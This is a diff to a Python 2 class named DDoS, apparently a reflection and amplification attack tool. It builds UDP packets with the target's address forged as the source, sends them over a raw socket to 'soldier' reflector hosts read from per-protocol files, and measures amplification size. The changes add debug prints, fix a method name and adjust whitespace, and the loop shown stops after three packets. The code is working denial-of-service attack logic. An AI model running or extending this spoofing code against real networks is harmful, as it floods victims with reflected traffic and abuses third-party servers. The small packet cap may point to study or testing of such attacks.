@@ -185,6 +185,7 @@ class DDoS(object):
 		'''
 		udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
 		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
+		print "send spoof packet with self.target=" +str(self.target)
 		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
 	def GetAmpSize(self, proto, soldier, domain=''):
 		'''
@@ -214,13 +215,14 @@ class DDoS(object):
 		finally:
 			sock.close()
 		return len(data), len(packet)
-	def SentTrueIp(self,proto,soldier, domain=''):
+	def SendTrueIp(self,proto,soldier, domain=''):
 		'''
 			Mark for True source ip
 		'''
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		sock.settimeout(2)		
 		packet = 'this is for send true source ip'
+		print "send true ip of " + sock.getsockname()[0]
 		sock.sendto(packet, (soldier, PORT[proto]))
 		sock.close()
 		return len(packet)		
@@ -248,8 +250,8 @@ class DDoS(object):
 			f = open(_files[proto][FILE_NAME], 'r')
 			_files[proto].append(f)		# _files = {'proto':['file_name', file_handle]}
 		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-		i = 0
-		self.SentTrueIp(proto,self.target)
+		i = 0		
+		self.SendTrueIp(proto,self.target)
 		while npackets <3:
 			for proto in _files:
 				soldier = _files[proto][FILE_HANDLE].readline().strip()
@@ -282,7 +284,7 @@ class DDoS(object):
 						npackets += 1
 						print "npackets" +str(npackets)
 						i+=1
-						#nbytes += amplification[proto][soldier]
+						#nbytes += amplification[proto][soldier]						
 						self.__send(sock, soldier, proto, amp)
 				else:
 					_files[proto][FILE_HANDLE].seek(0)
